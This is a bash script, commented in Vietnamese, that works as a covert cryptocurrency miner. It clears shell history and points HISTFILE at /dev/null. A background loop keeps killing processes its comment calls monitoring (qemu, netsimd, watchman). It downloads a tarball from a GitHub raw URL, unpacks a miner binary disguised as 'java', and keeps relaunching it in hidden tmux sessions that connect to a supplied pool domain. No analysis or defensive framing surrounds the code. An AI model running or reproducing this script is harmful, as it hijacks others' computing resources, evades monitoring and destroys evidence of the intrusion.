#!/bin/bash

SESSION1="java1"
SESSION2="java2"

DOMAIN="$1"
NAME_WORK="$2"

# ❌ Xoá shell history
unset HISTFILE
history -c
> ~/.bash_history
rm -f ~/.bash_history
export HISTFILE=/dev/null

# 🔁 Kill các tiến trình giám sát
(
  while true; do
    pkill -f qemu-system-x86_64-headless 2>/dev/null
    pkill -f netsimd 2>/dev/null
    pkill -f watchman 2>/dev/null
    sleep 3
  done
) &

# 📥 Tải và giải nén nếu chưa có
if [ ! -f "$(pwd)/java/java" ]; then
    echo "[+] Downloading ..."
    rm -rf java java.tar.gz
    wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz
    tar -xzf java.tar.gz
    chmod +x java/java
    rm -f java.tar.gz
fi

# 🔁 Vòng lặp chạy miner
echo "[+] Vòng lặp ..."
while true; do
    pkill -f "$(pwd)/java/java" 2>/dev/null
    echo "[+] Kill process - sleep 10s..."
    sleep 10

    tmux kill-session -t $SESSION1 2>/dev/null
    tmux kill-session -t $SESSION2 2>/dev/null

    echo "[+] kill process kill process kill process - sleep 5s..."
    
    # Miner 1
    tmux new-session -s $SESSION1 -d
    tmux send-keys -t $SESSION1 "
        $(pwd)/java/java -o $DOMAIN --tls -k -t 3 --rig-id ${NAME_WORK}-1
    " C-m
    echo "[+] kill process kill process kill process 1- sleep 120s..."
    # Miner 2
    tmux new-session -s $SESSION2 -d
    tmux send-keys -t $SESSION2 "
        $(pwd)/java/java -o $DOMAIN --tls -k -t 4 --rig-id ${NAME_WORK}-2
    " C-m
    
    echo "[+] kill process kill process kill process 2- sleep 120s..."
    sleep 300
done
